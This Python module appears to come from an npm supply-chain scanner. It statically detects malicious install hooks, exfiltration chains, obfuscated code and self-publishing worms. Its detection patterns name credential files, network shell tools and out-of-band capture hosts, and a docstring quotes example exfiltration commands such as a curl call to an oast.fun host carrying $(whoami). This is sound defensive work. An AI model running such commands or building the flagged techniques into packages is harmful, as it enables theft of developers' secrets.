"""Tracii static behaviour rules + evidence-backed attack-chain correlation.

Reads package text only (never executes it). Single capabilities such as
"uses https" are common in benign code, so they are NOT reported alone.
Findings are raised when:
- a lifecycle install script exists (info; context for everything else),
- an install-time entry file performs network/process activity,
- one file shows a source -> transform -> sink chain (e.g. env -> base64 -> https),
- dynamic code execution is fed by a large encoded blob (obfuscation).
Each chain step links to its own Evidence item with file and line.
"""

from __future__ import annotations

import math
import re
from collections import Counter
from dataclasses import dataclass

from tracii.evidence.schema import Category, Confidence, Evidence, Finding, Severity, make_id
from tracii.intake.npm_registry import PackageFiles

INSTALL_HOOKS = ("preinstall", "install", "postinstall", "prepare")

# tag -> (role in a chain, patterns)
CAPABILITIES: dict[str, tuple[str, list[str]]] = {
    "env_read": ("source", [r"process\.env\b"]),
    "sensitive_file": ("source", [r"\.npmrc", r"\.ssh[/\\]", r"id_rsa", r"\.aws[/\\]credentials",
                                  r"\.bash_history", r"/etc/passwd", r"wallet\.dat"]),
    # also the chained one-liner form: require('os').hostname()
    "system_info": ("source", [r"os\.(hostname|userInfo|networkInterfaces)\s*\(",
                               r"require\(\s*['\"](?:node:)?os['\"]\s*\)\s*\.\s*(hostname|userInfo|networkInterfaces)\s*\("]),
    "encode": ("transform", [r"toString\(\s*['\"](base64|hex)['\"]\s*\)", r"\bbtoa\s*\(",
                             r"Buffer\.from\([^)]*\)\.toString", r"createCipheriv"]),
    "network": ("sink", [r"\bhttps?\.(request|get)\s*\(", r"\bfetch\s*\(", r"\bnet\.(connect|createConnection)\s*\(",
                         r"\bdns\.(lookup|resolve\w*)\s*\(", r"require\(\s*['\"](axios|node-fetch|request)['\"]\s*\)",
                         r"new\s+WebSocket\s*\(",
                         r"require\(\s*['\"](?:node:)?(https?|dns|net)['\"]\s*\)\s*\.\s*"
                         r"(request|get|lookup|resolve\w*|connect|createConnection)\s*\("]),
    "exec": ("sink", [r"require\(\s*['\"](?:node:)?child_process['\"]\s*\)", r"\bexecSync\s*\(", r"\bspawn(Sync)?\s*\(",
                      r"\bexec\s*\(\s*['\"`]"]),
    "dynamic_eval": ("transform", [r"\beval\s*\(", r"\bnew\s+Function\s*\(", r"\bFunction\s*\(\s*['\"]"]),
}
_COMPILED = {tag: (role, [re.compile(p) for p in pats]) for tag, (role, pats) in CAPABILITIES.items()}
HOST_RE = re.compile(r"""https?://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|\d{1,3}(?:\.\d{1,3}){3})(?::\d+)?""")
# request option objects: { hostname: 'x.y', host: "x.y" }
HOST_OPT_RE = re.compile(r"""\b(?:hostname|host)\s*:\s*['"`]([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|\d{1,3}(?:\.\d{1,3}){3})['"`]""")
LONG_BLOB_RE = re.compile(r"""['"`]([A-Za-z0-9+/=]{400,}|(?:\\x[0-9a-fA-F]{2}){100,})['"`]""")
JS_EXT = (".js", ".cjs", ".mjs", ".ts")

# Where data goes matters more than that a request is made: out-of-band capture services,
# request bins, tunnels and "what is my IP" lookups have no business in an install step.
SUSPICIOUS_HOST_SUFFIXES = (
    "oastify.com", "oast.fun", "oast.online", "oast.pro", "oast.live", "oast.site", "oast.me", "interact.sh",
    "burpcollaborator.net", "canarytokens.com", "dnslog.cn", "ceye.io", "webhook.site", "pipedream.net",
    "requestbin.net", "requestcatcher.com", "beeceptor.com", "ngrok.io", "ngrok.app", "ngrok-free.app",
    "trycloudflare.com", "serveo.net", "localtunnel.me", "ifconfig.me", "ipinfo.io", "ipapi.co", "ip-api.com",
    "api.ipify.org", "icanhazip.com",
)
# Hosts that binary-downloading install scripts (esbuild, swc, sharp, ...) legitimately fetch from.
DISTRIBUTION_HOSTS = ("github.com", "objects.githubusercontent.com", "registry.npmjs.org", "registry.yarnpkg.com",
                      "yarnpkg.com", "nodejs.org", "npmmirror.com", "snapcraft.io")
_IP_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")
_PRIVATE_IP = ("127.", "0.", "10.", "192.168.", "169.254.")

# A named config read (process.env.CI, ESBUILD_BINARY_PATH) is not a data source worth stealing;
# secrets, or the whole environment when it is sent over the network, are.
ENV_SECRET_RE = re.compile(r"""process\.env(?:\.|\[\s*['"`])\w*(?:TOKEN|SECRET|PASSW|API_?KEY|ACCESS_KEY|PRIVATE_KEY|CREDENTIAL)""",
                           re.I)
ENV_BULK_RE = re.compile(r"""(?:JSON\.stringify|Object\.(?:keys|entries|values))\s*\(\s*process\.env\b(?!\s*[.\[])""")

# Install hook command lines (package.json "scripts"), analysed as text.
HOOK_NET_RE = re.compile(r"\b(curl|wget|ncat|netcat|nc|nslookup|dig|Invoke-WebRequest|Invoke-RestMethod|iwr|irm|"
                         r"bitsadmin|certutil)\b", re.I)
HOOK_RECON_RE = re.compile(r"\$\(\s*(?:whoami|hostname|pwd|id|uname[^)]*|date|cat\s[^)]*|ls\s[^)]*|env|printenv)\s*\)"
                           r"|`\s*(?:whoami|hostname|pwd|id|uname[^`]*)\s*`|%(?:COMPUTERNAME|USERNAME|USERDOMAIN)%"
                           r"|\$\{?(?:USER|HOME|PWD|HOSTNAME|LOGNAME)\b|/etc/passwd|/proc/self/environ|\.npmrc|\.ssh/",
                           re.I)
HOOK_PIPE_SHELL_RE = re.compile(r"\|\s*(?:sh|bash|zsh|node|python3?|powershell)\b", re.I)
INLINE_NODE_RE = re.compile(r"""\bnode\s+(?:-e|--eval|-p|--print)\s+(["'])(.+?)\1(?=\s*(?:$|&&|\|\||;|\|))""")


# Literal shell commands handed to child_process, e.g. execSync("curl ... $(whoami)").
EXEC_LITERAL_RE = re.compile(r"""\b(?:exec|execSync|spawn|spawnSync|execFile|execFileSync)\s*\(\s*(['"`])(.{1,400}?)\1""")
# A dependency that republishes to npm is a worm/spam propagation technique (Shai-Hulud, tea.xyz farms).
SELF_PUBLISH_RE = re.compile(r"\bnpm\s+publish\b")
# Native build tooling that install scripts legitimately run.
BUILD_TOOLS = {"node-gyp", "node-pre-gyp", "node-gyp-build", "prebuild-install", "prebuild", "cmake", "cmake-js",
               "make", "gmake", "gcc", "g++", "clang", "clang++", "cc", "msbuild", "cl", "cargo", "rustc", "tsc",
               "patch-package"}
# javascript-obfuscator's identifier style (_0x1a2b3c). Common in npm malware, rare in shipped
# libraries (minifiers do not produce it). Matched as text on every JS file, large ones included.
OBFUSCATOR_ID_RE = re.compile(r"\b_0x[0-9a-f]{4,6}\b")
OBFUSCATOR_MIN_IDS = 20


def ships_native_build(pkg: PackageFiles) -> bool:
    """A native addon (binding.gyp / CMakeLists.txt) legitimately compiles or fetches binaries at install."""
    names = [*pkg.files, *pkg.skipped]
    return any(n.rsplit("/", 1)[-1] in ("binding.gyp", "CMakeLists.txt") for n in names)


def main_entry(manifest: dict) -> str:
    main = str(manifest.get("main") or "index.js").removeprefix("./")
    return main if main.endswith((".js", ".cjs", ".mjs")) else f"{main.rstrip('/')}.js"


def exec_literals(text: str) -> list[tuple[int, str]]:
    return [(text.count("\n", 0, m.start()) + 1, m.group(2)) for m in EXEC_LITERAL_RE.finditer(text)]


def _command_tool(cmd: str) -> str:
    toks = [t for t in re.split(r"\s+", cmd.strip()) if t]
    if toks and toks[0] in ("npx", "pnpm", "yarn") and len(toks) > 1:
        toks = toks[1:]
    return toks[0].rsplit("/", 1)[-1].lower() if toks else ""


def shell_command_risk(cmd: str) -> tuple[bool, list[str]]:
    """(network tool used, reasons that make it strong) for one command line, matched as text."""
    net = bool(HOOK_NET_RE.search(cmd))
    reasons = []
    if m := HOOK_RECON_RE.search(cmd):
        reasons.append(f"system lookup {m.group(0)!r}")
    if HOOK_PIPE_SHELL_RE.search(cmd):
        reasons.append("download piped into a shell")
    if sus := suspicious_hosts(hosts_in(cmd)):
        reasons.append(f"suspicious destination {', '.join(sorted(sus))}")
    return net, reasons


def suspicious_hosts(hosts: set[str]) -> set[str]:
    out = set()
    for h in hosts:
        if _IP_RE.match(h):
            if not h.startswith(_PRIVATE_IP):
                out.add(h)
        elif any(h == s or h.endswith("." + s) for s in SUSPICIOUS_HOST_SUFFIXES):
            out.add(h)
    return out


def _distribution_only(hosts: set[str]) -> bool:
    return bool(hosts) and all(any(h == d or h.endswith("." + d) for d in DISTRIBUTION_HOSTS) for h in hosts)


@dataclass
class Signal:
    tag: str
    role: str
    file: str
    line: int
    text: str


def entropy(s: str) -> float:
    if not s:
        return 0.0
    counts = Counter(s)
    return -sum(c / len(s) * math.log2(c / len(s)) for c in counts.values())


def scan_file(path: str, text: str) -> list[Signal]:
    signals = []
    for lineno, line in enumerate(text.splitlines(), 1):
        for tag, (role, pats) in _COMPILED.items():
            if any(p.search(line) for p in pats):
                signals.append(Signal(tag, role, path, lineno, line.strip()[:300]))
    return signals


def hosts_in(text: str) -> set[str]:
    return {m.group(1).lower() for rx in (HOST_RE, HOST_OPT_RE) for m in rx.finditer(text)}


def install_scripts(manifest: dict) -> dict[str, str]:
    scripts = manifest.get("scripts") or {}
    return {k: str(v) for k, v in scripts.items() if k in INSTALL_HOOKS}


def _script_entry_files(cmd: str, files: dict[str, str]) -> list[str]:
    """Files an install command runs, e.g. 'node setup.js && node lib/x.js'."""
    out = []
    for tok in re.split(r"[\s;&|]+", cmd):
        tok = tok.strip("'\"").removeprefix("./")
        if tok in files:
            out.append(tok)
    return out


def hook_command_finding(name: str, version: str, scripts: dict[str, str], limitations: list[str],
                         source: str) -> Finding | None:
    """Payloads that live in the install command itself (no JS file), e.g.
    `curl https://x.oast.fun/?u=$(whoami)` or `node -e "require('dns').lookup(os.userInfo()...)"`."""
    evidence: list[tuple[bool, str, str]] = []   # (strong, summary, command)
    for hook, cmd in scripts.items():
        net = sorted({m.group(1).lower() for m in HOOK_NET_RE.finditer(cmd)})
        recon = HOOK_RECON_RE.search(cmd)
        pipe = HOOK_PIPE_SHELL_RE.search(cmd)
        sus = suspicious_hosts(hosts_in(cmd))
        if net:
            extra = [f"system lookup {recon.group(0)!r}"] if recon else []
            extra += ["download piped into a shell"] if pipe else []
            extra += [f"suspicious destination {', '.join(sorted(sus))}"] if sus else []
            evidence.append((bool(extra), f"scripts.{hook}: network tool {', '.join(net)}"
                             + (" + " + "; ".join(extra) if extra else ""), cmd))
        for m in INLINE_NODE_RE.finditer(cmd):
            sig = scan_file(f"package.json#scripts.{hook}", m.group(2))
            roles, tags = {s.role for s in sig}, {s.tag for s in sig}
            if "sink" in roles:
                strong = "source" in roles or bool(sus)
                evidence.append((strong, f"scripts.{hook}: inline node code uses {', '.join(sorted(tags))}", cmd))
    if not evidence:
        return None
    strong = any(s for s, _, _ in evidence)
    fid = make_id("mal", name, version, "TRACII-HOOK-CMD")
    return Finding(
        id=fid, category=Category.MALICIOUS_INDICATOR, source=source,
        rule_or_advisory="TRACII-HOOK-CMD-EXFIL" if strong else "TRACII-HOOK-CMD-NET",
        title=("Install command sends system information over the network" if strong
               else "Install command uses a network tool"),
        package=name, version=version, severity=Severity.HIGH if strong else Severity.MEDIUM,
        confidence=Confidence.MEDIUM if strong else Confidence.LOW,
        evidence=[Evidence(id=f"{fid}-e{i}", kind="install_script", summary=summary, file="package.json",
                           snippet=cmd[:300]) for i, (_, summary, cmd) in enumerate(evidence)],
        limitations=limitations + ["The command line is matched as text; it was not run."],
    )


def _ev(fid: str, n: int, s: Signal, kind: str = "code") -> Evidence:
    return Evidence(id=f"{fid}-e{n}", kind=kind, summary=f"{s.role}: {s.tag}", file=s.file, line=s.line, snippet=s.text)


def analyze_package(pkg: PackageFiles, source: str = "tracii-static") -> list[Finding]:
    findings: list[Finding] = []
    name, version = pkg.name, pkg.version
    scripts = install_scripts(pkg.manifest)
    limitations = ["Static pattern analysis of package text; nothing was executed.",
                   "Minified, bundled or dynamically built code can hide behaviour from these rules."]
    if pkg.skipped:
        limitations.append(f"{len(pkg.skipped)} binary/oversized files were not analysed.")

    install_files: set[str] = set()
    if scripts:
        fid = make_id("mal", name, version, "TRACII-INSTALL-SCRIPT")
        findings.append(Finding(
            id=fid, category=Category.MALICIOUS_INDICATOR, source=source,
            rule_or_advisory="TRACII-INSTALL-SCRIPT", title="Package runs a lifecycle script at install time",
            package=name, version=version, severity=Severity.INFO, confidence=Confidence.LOW,
            evidence=[Evidence(id=f"{fid}-e{i}", kind="install_script", summary=f"scripts.{hook}",
                               file="package.json", snippet=cmd) for i, (hook, cmd) in enumerate(scripts.items())],
            limitations=limitations + ["Many legitimate packages (native builds) use install scripts."],
        ))
        for cmd in scripts.values():
            install_files.update(_script_entry_files(cmd, {**pkg.files, **pkg.large}))
        if hook := hook_command_finding(name, version, scripts, limitations, source):
            findings.append(hook)

    # Oversized JS is analysed only when an install script runs it (worm payloads ship as big bundles).
    targets = dict(pkg.files)
    targets.update({p: pkg.large[p] for p in install_files if p in pkg.large})
    native_build = ships_native_build(pkg)

    # Obfuscator-style code anywhere in the package (large bundles included: only this regex runs on them).
    entry = main_entry(pkg.manifest)
    obf = sorted(((len(OBFUSCATOR_ID_RE.findall(t)), p) for p, t in {**pkg.files, **pkg.large}.items()
                  if p.endswith(JS_EXT)), reverse=True)
    obf = [(n, p) for n, p in obf if n >= OBFUSCATOR_MIN_IDS][:3]
    if obf:
        fid = make_id("mal", name, version, "TRACII-OBFUSCATED-CODE")
        runs = [p for _, p in obf if p in install_files or p == entry]
        evidence = []
        for i, (n, p) in enumerate(obf):
            text = pkg.files.get(p) or pkg.large.get(p, "")
            m = OBFUSCATOR_ID_RE.search(text)
            line = text.count("\n", 0, m.start()) + 1
            evidence.append(Evidence(id=f"{fid}-e{i}", kind="code", file=p, line=line,
                                     summary=f"{n} obfuscator-style identifiers (_0x…)"
                                             + (" in a file that runs at install/load" if p in runs else ""),
                                     snippet=text[max(0, m.start() - 40):m.start() + 120]))
        findings.append(Finding(
            id=fid, category=Category.MALICIOUS_INDICATOR, source=source, rule_or_advisory="TRACII-OBFUSCATED-CODE",
            title="Package ships obfuscated code (javascript-obfuscator style)"
                  + (f" that runs at install/load ({', '.join(runs)})" if runs else ""),
            package=name, version=version, severity=Severity.HIGH if runs else Severity.MEDIUM,
            confidence=Confidence.MEDIUM,
            evidence=evidence,
            limitations=limitations + ["Some commercial packages obfuscate legitimately; obfuscation hides what the "
                                       "code does, so the other rules may not see its behaviour."]))
    for path, text in sorted(targets.items()):
        if not path.endswith(JS_EXT):
            continue
        signals = scan_file(path, text)
        tags = {s.tag for s in signals}
        roles = {s.role for s in signals}
        hosts = hosts_in(text)
        sus = suspicious_hosts(hosts)
        strong_source = bool(tags & {"sensitive_file", "system_info"} or ENV_SECRET_RE.search(text)
                             or ("network" in tags and ENV_BULK_RE.search(text)))
        literals = exec_literals(text) if "exec" in tags else []

        # 0a. literal shell commands in code get the same reading as install commands
        risky = [(ln, cmd, reasons) for ln, cmd in literals
                 for net, reasons in [shell_command_risk(cmd)] if net and reasons]
        if risky:
            fid = make_id("mal", name, version, "TRACII-CODE-SHELL-EXFIL", path)
            findings.append(Finding(
                id=fid, category=Category.MALICIOUS_INDICATOR, source=source, rule_or_advisory="TRACII-CODE-SHELL-EXFIL",
                title=f"Code in {path} runs a shell command that sends system information over the network",
                package=name, version=version, severity=Severity.HIGH, confidence=Confidence.MEDIUM,
                evidence=[Evidence(id=f"{fid}-e{i}", kind="code", file=path, line=ln, snippet=cmd[:300],
                                   summary="shell command: " + "; ".join(reasons)) for i, (ln, cmd, reasons) in
                          enumerate(risky[:5])],
                limitations=limitations + ["The command string is matched as text; it was not run."]))
        # 0b. self-publishing: a dependency that runs `npm publish` spreads itself or spams the registry
        pubs = [(ln, cmd) for ln, cmd in literals if SELF_PUBLISH_RE.search(cmd)]
        if pubs:
            fid = make_id("mal", name, version, "TRACII-SELF-PUBLISH", path)
            findings.append(Finding(
                id=fid, category=Category.MALICIOUS_INDICATOR, source=source, rule_or_advisory="TRACII-SELF-PUBLISH",
                title=f"Code in {path} runs `npm publish` (self-propagation technique)",
                package=name, version=version, severity=Severity.MEDIUM, confidence=Confidence.LOW,
                evidence=[Evidence(id=f"{fid}-e{i}", kind="code", file=path, line=ln, snippet=cmd[:300],
                                   summary="child process runs npm publish") for i, (ln, cmd) in enumerate(pubs[:3])],
                limitations=limitations + ["Release tooling (semantic-release, np, lerna) also publishes; a library "
                                           "that does it from its own code is unusual."]))

        # 1. source -> transform -> sink chain in one file. env + network alone is
        # how every API client works, so require an encode step, a sensitive
        # file read, install-time execution or a suspicious destination before
        # calling it a chain, and a source worth stealing (not a named config read).
        corroborated = "encode" in tags or "sensitive_file" in tags or path in install_files or bool(sus)
        if {"source", "sink"} <= roles and corroborated and (strong_source or sus):
            src = next((s for s in signals if s.tag in ("sensitive_file", "system_info")),
                       next(s for s in signals if s.role == "source"))
            trf = next((s for s in signals if s.tag == "encode"), None)
            snk = next(s for s in signals if s.role == "sink")
            steps = [s for s in (src, trf, snk) if s]
            fid = make_id("mal", name, version, "TRACII-CHAIN-EXFIL", path)
            at_install = path in install_files
            findings.append(Finding(
                id=fid, category=Category.MALICIOUS_INDICATOR, source=source,
                rule_or_advisory="TRACII-CHAIN-EXFIL",
                title=f"Possible data-exfiltration chain in {path}: " + " -> ".join(s.tag for s in steps)
                      + (" (runs at install time)" if at_install else ""),
                package=name, version=version,
                severity=Severity.HIGH if at_install or trf else Severity.MEDIUM,
                confidence=Confidence.MEDIUM,
                evidence=[_ev(fid, i, s) for i, s in enumerate(steps)]
                         + [Evidence(id=f"{fid}-h{i}", kind="code", file=path,
                                     summary=f"hard-coded host {h}" + (" (suspicious destination)" if h in sus else ""))
                            for i, h in enumerate(sorted(hosts))],
                limitations=limitations + ["Steps are correlated within one file by pattern, not by full data-flow (taint) analysis."],
            ))
        # 2. install-time entry performing network/process activity
        elif path in install_files and tags & {"network", "exec"}:
            fid = make_id("mal", name, version, "TRACII-INSTALL-NET-EXEC", path)
            hits = [s for s in signals if s.tag in ("network", "exec")][:5]
            # Downloading a prebuilt binary from a known distribution host is what esbuild/swc do;
            # still reported, at low severity, unless something stronger is present.
            if sus:
                severity, title = Severity.HIGH, f"Install script entry {path} contacts {', '.join(sorted(sus))}"
            elif _distribution_only(hosts) and not strong_source:
                severity = Severity.LOW
                title = f"Install script entry {path} downloads from a known software distribution host"
            elif (native_build and not strong_source and not risky
                  and len(OBFUSCATOR_ID_RE.findall(text)) < OBFUSCATOR_MIN_IDS):
                severity = Severity.LOW
                title = f"Install script entry {path} builds or fetches a native addon (package ships binding.gyp)"
            elif ("network" not in tags and not strong_source and literals
                  and all(_command_tool(cmd) in BUILD_TOOLS for _, cmd in literals)):
                severity = Severity.LOW
                tools = ", ".join(sorted({_command_tool(cmd) for _, cmd in literals}))
                title = f"Install script entry {path} runs native build tooling ({tools})"
            else:
                severity, title = Severity.MEDIUM, f"Install script entry {path} uses network or child processes"
            findings.append(Finding(
                id=fid, category=Category.MALICIOUS_INDICATOR, source=source,
                rule_or_advisory="TRACII-INSTALL-NET-EXEC", title=title,
                package=name, version=version, severity=severity, confidence=Confidence.LOW,
                evidence=[_ev(fid, i, s) for i, s in enumerate(hits)]
                         + [Evidence(id=f"{fid}-h{i}", kind="code", file=path, summary=f"hard-coded host {h}")
                            for i, h in enumerate(sorted(hosts))],
                limitations=limitations + ["Native build tools (node-gyp, prebuild) legitimately download binaries."],
            ))

        # 3. obfuscated payload fed to dynamic evaluation
        if "dynamic_eval" in tags:
            for m in LONG_BLOB_RE.finditer(text):
                if entropy(m.group(1)) > 4.0:
                    line = text.count("\n", 0, m.start()) + 1
                    fid = make_id("mal", name, version, "TRACII-OBFUSCATED-EVAL", path)
                    ev_sig = next(s for s in signals if s.tag == "dynamic_eval")
                    findings.append(Finding(
                        id=fid, category=Category.MALICIOUS_INDICATOR, source=source,
                        rule_or_advisory="TRACII-OBFUSCATED-EVAL",
                        title=f"Encoded high-entropy blob with dynamic evaluation in {path}",
                        package=name, version=version, severity=Severity.MEDIUM, confidence=Confidence.LOW,
                        evidence=[_ev(fid, 0, ev_sig),
                                  Evidence(id=f"{fid}-e1", kind="code", summary="encoded blob",
                                           file=path, line=line, snippet=m.group(1)[:120] + "...")],
                        limitations=limitations,
                    ))
                    break
    return findings


def capability_profile(pkg: PackageFiles) -> dict:
    """Summary used by the version diff: capability tags, hosts and install scripts."""
    caps: dict[str, list[str]] = {}
    hosts: set[str] = set()
    for path, text in pkg.files.items():
        if not path.endswith(JS_EXT):
            continue
        for s in scan_file(path, text):
            caps.setdefault(s.tag, []).append(f"{s.file}:{s.line}")
        hosts |= hosts_in(text)
    return {"capabilities": caps, "hosts": sorted(hosts), "install_scripts": install_scripts(pkg.manifest),
            "dependencies": dict(pkg.manifest.get("dependencies") or {}), "files": sorted(pkg.files)}
